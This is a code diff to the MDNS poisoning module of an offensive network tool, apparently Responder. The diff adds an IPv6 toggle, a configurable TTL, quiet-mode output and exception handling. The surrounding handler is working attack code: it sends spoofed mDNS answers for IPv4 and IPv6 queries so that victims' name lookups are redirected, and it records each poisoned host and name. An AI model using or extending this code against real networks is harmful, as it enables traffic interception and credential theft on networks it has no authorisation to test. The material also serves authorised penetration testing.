@@ -23,6 +23,9 @@ else:
 from packets import MDNS_Ans, MDNS6_Ans
 from utils import *
 
+#Should we answer to those AAAA?
+Have_IPv6 = settings.Config.IPv6
+
 def Parse_MDNS_Name(data):
 	try:
 		if (sys.version_info > (3, 0)):
@@ -51,47 +54,59 @@ def Poisoned_MDNS_Name(data):
 
 class MDNS(BaseRequestHandler):
 	def handle(self):
-
-		data, soc = self.request
-		Request_Name = Parse_MDNS_Name(data)
-		MDNSType = Parse_IPV6_Addr(data)
-		# Break out if we don't want to respond to this host
+		try:
+			data, soc = self.request
+			Request_Name = Parse_MDNS_Name(data)
+			MDNSType = Parse_IPV6_Addr(data)
+			# Break out if we don't want to respond to this host
 		
-		if (not Request_Name) or (RespondToThisHost(self.client_address[0].replace("::ffff:",""), Request_Name) is not True):
-			return None
+			if (not Request_Name) or (RespondToThisHost(self.client_address[0].replace("::ffff:",""), Request_Name) is not True):
+				return None
 
-		if settings.Config.AnalyzeMode:  # Analyze Mode
-			print(text('[Analyze mode: MDNS] Request by %-15s for %s, ignoring' % (color(self.client_address[0].replace("::ffff:",""), 3), color(Request_Name, 3))))
-			SavePoisonersToDb({
+			if settings.Config.AnalyzeMode:  # Analyze Mode
+				# Don't print if in Quiet Mode
+				if not settings.Config.Quiet_Mode:
+					print(text('[Analyze mode: MDNS] Request by %-15s for %s, ignoring' % (color(self.client_address[0].replace("::ffff:",""), 3), color(Request_Name, 3))))
+				SavePoisonersToDb({
 						'Poisoner': 'MDNS', 
 						'SentToIp': self.client_address[0], 
 						'ForName': Request_Name,
 						'AnalyzeMode': '1',
-					})
-		elif MDNSType == True:  # Poisoning Mode
-			Poisoned_Name = Poisoned_MDNS_Name(data)
-			Buffer = MDNS_Ans(AnswerName = Poisoned_Name)
-			Buffer.calculate()
-			soc.sendto(NetworkSendBufferPython2or3(Buffer), self.client_address)
-			if not settings.Config.Quiet_Mode:
-				print(color('[*] [MDNS] Poisoned answer sent to %-15s for name %s' % (self.client_address[0].replace("::ffff:",""), Request_Name), 2, 1))
-			SavePoisonersToDb({
+						})
+			elif MDNSType == True:  # Poisoning Mode
+				Poisoned_Name = Poisoned_MDNS_Name(data)
+				#Use default:
+				if settings.Config.TTL == None:
+					Buffer = MDNS_Ans(AnswerName = Poisoned_Name)
+				else:
+					Buffer = MDNS_Ans(AnswerName = Poisoned_Name, TTL=settings.Config.TTL)
+				Buffer.calculate()
+				soc.sendto(NetworkSendBufferPython2or3(Buffer), self.client_address)
+				if not settings.Config.Quiet_Mode:
+					print(color('[*] [MDNS] Poisoned answer sent to %-15s for name %s' % (self.client_address[0].replace("::ffff:",""), Request_Name), 2, 1))
+				SavePoisonersToDb({
 						'Poisoner': 'MDNS', 
 						'SentToIp': self.client_address[0], 
 						'ForName': Request_Name,
 						'AnalyzeMode': '0',
-					})
+						})
 
-		elif MDNSType == 'IPv6':  # Poisoning Mode
-			Poisoned_Name = Poisoned_MDNS_Name(data)
-			Buffer = MDNS6_Ans(AnswerName = Poisoned_Name)
-			Buffer.calculate()
-			soc.sendto(NetworkSendBufferPython2or3(Buffer), self.client_address)
-			if not settings.Config.Quiet_Mode:
-				print(color('[*] [MDNS] Poisoned answer sent to %-15s for name %s' % (self.client_address[0].replace("::ffff:",""), Request_Name), 2, 1))
-			SavePoisonersToDb({
+			elif MDNSType == 'IPv6' and Have_IPv6:  # Poisoning Mode
+				Poisoned_Name = Poisoned_MDNS_Name(data)
+				#Use default:
+				if settings.Config.TTL == None:
+					Buffer = MDNS6_Ans(AnswerName = Poisoned_Name)
+				else:
+					Buffer = MDNS6_Ans(AnswerName = Poisoned_Name, TTL= settings.Config.TTL)
+				Buffer.calculate()
+				soc.sendto(NetworkSendBufferPython2or3(Buffer), self.client_address)
+				if not settings.Config.Quiet_Mode:
+					print(color('[*] [MDNS] Poisoned answer sent to %-15s for name %s' % (self.client_address[0].replace("::ffff:",""), Request_Name), 2, 1))
+				SavePoisonersToDb({
 						'Poisoner': 'MDNS6', 
 						'SentToIp': self.client_address[0], 
 						'ForName': Request_Name,
 						'AnalyzeMode': '0',
-					})
+						})
+		except:
+			raise
